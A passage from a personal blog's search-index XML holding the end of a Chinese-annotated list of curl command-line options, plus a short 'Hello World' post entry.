using c_rehash) to verify peer against (SSL)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ciphers &lt;list&gt;                SSL密码</span></pre></td></tr><tr><td class="code"><pre><span class="line">--compressed                    要求返回是压缩的形势 (using deflate or gzip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">--connect-timeout &lt;seconds&gt;    设置最大请求时间</span></pre></td></tr><tr><td class="code"><pre><span class="line">--create-dirs                  建立本地目录的目录层次结构</span></pre></td></tr><tr><td class="code"><pre><span class="line">--crlf                          上传是把LF转变成CRLF</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-create-dirs              如果远程目录不存在，创建远程目录</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-method [multicwd&#x2F;nocwd&#x2F;singlecwd]    控制CWD的使用</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-pasv                      使用 PASV&#x2F;EPSV 代替端口</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-skip-pasv-ip              使用PASV的时候,忽略该IP地址</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-ssl                      尝试用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ftp-ssl-reqd                  要求用 SSL&#x2F;TLS 来进行ftp数据传输</span></pre></td></tr><tr><td class="code"><pre><span class="line">*-F&#x2F;--form &lt;name&#x3D;content&gt;        模拟http表单提交数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">-form-string &lt;name&#x3D;string&gt;      模拟http表单提交数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">-g&#x2F;--globoff                    禁用网址序列和范围使用&#123;&#125;和[]</span></pre></td></tr><tr><td class="code"><pre><span class="line">* -G&#x2F;--get                        以get的方式来发送数据</span></pre></td></tr><tr><td class="code"><pre><span class="line">-h&#x2F;--help                      帮助</span></pre></td></tr><tr><td class="code"><pre><span class="line">*-H&#x2F;--header &lt;line&gt;              自定义头信息传递给服务器</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ignore-content-length        忽略的HTTP头信息的长度</span></pre></td></tr><tr><td class="code"><pre><span class="line">-i&#x2F;--include                    输出时包括protocol头信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">*-I&#x2F;--head                      只显示文档信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">-j&#x2F;--junk-session-cookies      读取文件时忽略session cookie</span></pre></td></tr><tr><td class="code"><pre><span class="line">--interface &lt;interface&gt;        使用指定网络接口&#x2F;地址</span></pre></td></tr><tr><td class="code"><pre><span class="line">--krb4 &lt;level&gt;                  使用指定安全级别的krb4</span></pre></td></tr><tr><td class="code"><pre><span class="line">-k&#x2F;--insecure                  允许不使用证书到SSL站点</span></pre></td></tr><tr><td class="code"><pre><span class="line">-K&#x2F;--config                    指定的配置文件读取</span></pre></td></tr><tr><td class="code"><pre><span class="line">-l&#x2F;--list-only                  列出ftp目录下的文件名称</span></pre></td></tr><tr><td class="code"><pre><span class="line">--limit-rate &lt;rate&gt;            设置传输速度</span></pre></td></tr><tr><td class="code"><pre><span class="line">--local-port&lt;NUM&gt;              强制使用本地端口号</span></pre></td></tr><tr><td class="code"><pre><span class="line">-m&#x2F;--max-time &lt;seconds&gt;        设置最大传输时间</span></pre></td></tr><tr><td class="code"><pre><span class="line">--max-redirs &lt;num&gt;              设置最大读取的目录数</span></pre></td></tr><tr><td class="code"><pre><span class="line">--max-filesize &lt;bytes&gt;          设置最大下载的文件总量</span></pre></td></tr><tr><td class="code"><pre><span class="line">-M&#x2F;--manual                    显示全手动</span></pre></td></tr><tr><td class="code"><pre><span class="line">-n&#x2F;--netrc                      从netrc文件中读取用户名和密码</span></pre></td></tr><tr><td class="code"><pre><span class="line">--netrc-optional                使用 .netrc 或者 URL来覆盖-n</span></pre></td></tr><tr><td class="code"><pre><span class="line">--ntlm                          使用 HTTP NTLM 身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">-N&#x2F;--no-buffer                  禁用缓冲输出</span></pre></td></tr><tr><td class="code"><pre><span class="line">-p&#x2F;--proxytunnel                使用HTTP代理</span></pre></td></tr><tr><td class="code"><pre><span class="line">--proxy-anyauth                选择任一代理身份验证方法</span></pre></td></tr><tr><td class="code"><pre><span class="line">--proxy-basic                  在代理上使用基本身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">--proxy-digest                  在代理上使用数字身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">--proxy-ntlm                    在代理上使用ntlm身份验证</span></pre></td></tr><tr><td class="code"><pre><span class="line">-P&#x2F;--ftp-port &lt;address&gt;        使用端口地址，而不是使用PASV</span></pre></td></tr><tr><td class="code"><pre><span class="line">-Q&#x2F;--quote &lt;cmd&gt;                文件传输前，发送命令到服务器</span></pre></td></tr><tr><td class="code"><pre><span class="line">--range-file                    读取（SSL）的随机文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">-R&#x2F;--remote-time                在本地生成文件时，保留远程文件时间</span></pre></td></tr><tr><td class="code"><pre><span class="line">--retry &lt;num&gt;                  传输出现问题时，重试的次数</span></pre></td></tr><tr><td class="code"><pre><span class="line">--retry-delay &lt;seconds&gt;        传输出现问题时，设置重试间隔时间</span></pre></td></tr><tr><td class="code"><pre><span class="line">--retry-max-time &lt;seconds&gt;      传输出现问题时，设置最大重试时间</span></pre></td></tr><tr><td class="code"><pre><span class="line">-S&#x2F;--show-error                显示错误</span></pre></td></tr><tr><td class="code"><pre><span class="line">--socks4 &lt;host[:port]&gt;          用socks4代理给定主机和端口</span></pre></td></tr><tr><td class="code"><pre><span class="line">--socks5 &lt;host[:port]&gt;          用socks5代理给定主机和端口</span></pre></td></tr><tr><td class="code"><pre><span class="line">-t&#x2F;--telnet-option &lt;OPT&#x3D;val&gt;    Telnet选项设置</span></pre></td></tr><tr><td class="code"><pre><span class="line">--trace &lt;file&gt;                  对指定文件进行debug</span></pre></td></tr><tr><td class="code"><pre><span class="line">--trace-ascii &lt;file&gt;            Like --跟踪但没有hex输出</span></pre></td></tr><tr><td class="code"><pre><span class="line">--trace-time                    跟踪&#x2F;详细输出时，添加时间戳</span></pre></td></tr><tr><td class="code"><pre><span class="line">--url &lt;URL&gt;                    Spet URL to work with</span></pre></td></tr><tr><td class="code"><pre><span class="line">-U&#x2F;--proxy-user &lt;user[:password]&gt;  设置代理用户名和密码</span></pre></td></tr><tr><td class="code"><pre><span class="line">-V&#x2F;--version                    显示版本信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">-X&#x2F;--request &lt;command&gt;          指定什么命令</span></pre></td></tr><tr><td class="code"><pre><span class="line">-y&#x2F;--speed-time                放弃限速所要的时间。默认为30</span></pre></td></tr><tr><td class="code"><pre><span class="line">-Y&#x2F;--speed-limit                停止传输速度的限制，速度时间&#39;秒</span></pre></td></tr><tr><td class="code"><pre><span class="line">-z&#x2F;--time-cond                  传送时间设置</span></pre></td></tr><tr><td class="code"><pre><span class="line">-0&#x2F;--http1.0                    使用HTTP 1.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">-1&#x2F;--tlsv1                      使用TLSv1（SSL）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-2&#x2F;--sslv2                      使用SSLv2的（SSL）</span></pre></td></tr><tr><td class="code"><pre><span class="line">-3&#x2F;--sslv3                      使用的SSLv3（SSL）</span></pre></td></tr><tr><td class="code"><pre><span class="line">--3p-quote                      like -Q for the source URL for 3rd party transfer</span></pre></td></tr><tr><td class="code"><pre><span class="line">--3p-url                        使用url，进行第三方传送</span></pre></td></tr><tr><td class="code"><pre><span class="line">--3p-user                      使用用户名和密码，进行第三方传送</span></pre></td></tr><tr><td class="code"><pre><span class="line">-4&#x2F;--ipv4                      使用IP4</span></pre></td></tr><tr><td class="code"><pre><span class="line">-6&#x2F;--ipv6                      使用IP6</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>command</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/09/hello-world/</url>
    <content><![CDATA[<h1 id="纪念新博客"><a href="#纪念新博客" class="headerlink" title="纪念新博客"></a>纪念新博客</h1><p><code>至此</code></p>
]]></content>
  </entry>
</search>
